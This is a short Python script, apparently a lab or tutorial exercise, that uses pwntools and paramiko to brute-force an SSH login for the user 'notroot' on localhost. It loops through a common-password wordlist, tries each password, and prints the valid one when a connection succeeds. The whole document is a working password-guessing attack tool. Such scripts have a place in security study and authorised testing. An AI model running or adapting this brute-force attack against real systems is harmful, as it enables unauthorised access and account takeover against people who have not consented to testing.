#import pwn tools
from pwn import *
import paramiko #import paramiko for error handling

host = "127.0.0.1"
username = "notroot"
attempts = 0

#open passwords text file in read mode
with open("ssh-common-passwords.txt", "r") as passwordlist:
    #iterate through password list
    for password in passwordlist:
        #clean up list by stripping new line
        password = password.strip("\n")
        #try to authenticate credentials
        try:
            #print number of attempts and attempted password
            print("[{}] Attempting password: '{}'!".format(attempts, password))
            response = ssh(host = host, user = username, password = password, timeout = 1)
            if response.connected():
                #if there is a valid connection, print the password used
                print("[>] Valid password found: '{}'!".format(password))
                response.close() #close the connection
                break
            response.close() #close the connection if password isn't valid
        #exception for if we know the authentication will fail
        except paramiko.ssh_exception.AuthenticationException:
            print("[X] Invalid password!")
        attempts += 1